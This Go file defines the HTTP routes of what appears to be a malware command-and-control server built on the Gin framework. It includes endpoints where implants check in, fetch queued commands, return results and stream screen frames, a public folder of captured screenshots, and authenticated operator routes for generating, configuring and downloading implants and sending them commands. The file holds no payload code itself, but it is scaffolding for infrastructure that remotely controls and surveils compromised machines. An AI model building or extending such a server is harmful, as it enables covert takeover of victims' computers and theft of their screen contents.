package routes

import (
	"awesomeProject/controllers"
	"awesomeProject/middleware"
	"path/filepath"

	"github.com/gin-gonic/gin"
)

func SetupRouter() *gin.Engine {
	r := gin.Default()

	absScreenshotPath, _ := filepath.Abs("./c2_screenshots") // Get absolute path
	r.StaticFS("/c2_screenshots", gin.Dir(absScreenshotPath, false))

	r.POST("/checkin", controllers.CheckinImplant)
	r.GET("/implant-client/:unique_token/commands", controllers.ImplantClientFetchCommands)
	r.POST("/command-result", controllers.HandleCommandResult)
	r.POST("/livestream-frame", controllers.HandleLivestreamFrame)

	r.POST("/register", controllers.Register)
	r.POST("/login", controllers.Login)

	protected := r.Group("/api")
	protected.Use(middleware.AuthMiddleware())
	{
		protected.GET("/implants", controllers.GetUserImplants)
		protected.POST("/generate-implant", controllers.GenerateImplant)
		protected.POST("/send-command", controllers.SendCommand)
		protected.GET("/implants/:implant_id/commands", controllers.DashboardGetCommandsForImplant)
		protected.DELETE("/implants/:implant_id", controllers.DeleteImplant)
		protected.POST("/implants/:implant_id/download-configured", controllers.DownloadConfiguredImplant)
		protected.GET("/implants/:implant_id/download", controllers.DownloadImplant) // Legacy/generic
		protected.GET("/implants/:implant_id/screenshots", controllers.GetScreenshotsForImplant)
	}

	return r
}
